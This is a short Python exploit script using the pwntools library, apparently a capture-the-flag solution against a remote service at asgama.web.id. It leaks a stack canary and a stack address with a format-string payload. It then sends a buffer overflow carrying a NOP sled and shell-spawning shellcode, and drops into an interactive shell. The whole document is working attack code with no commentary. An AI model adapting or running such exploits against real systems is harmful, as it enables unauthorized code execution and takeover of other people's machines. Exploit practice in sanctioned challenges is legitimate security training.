from pwn import *

context.arch='i386'

pad = 342

r = remote('asgama.web.id',40200)
r.recvuntil('>> ')
r.sendline("%83$x.%84$x")
r.recvuntil('Hai ')
addr = r.recvuntil('!')[:-1]

canary = int(addr.split('.')[0],16)
stack = int(addr.split('.')[1],16)

print hex(canary),hex(stack)

r.recv()

payload = 'A'*(0x142-0xc)+p32(canary)+p32(stack)
payload += 'A'*(pad-len(payload))+p32(stack)+'\x90'*0x100+asm(shellcraft.sh())+'\n'
r.sendline(payload)
r.interactive()
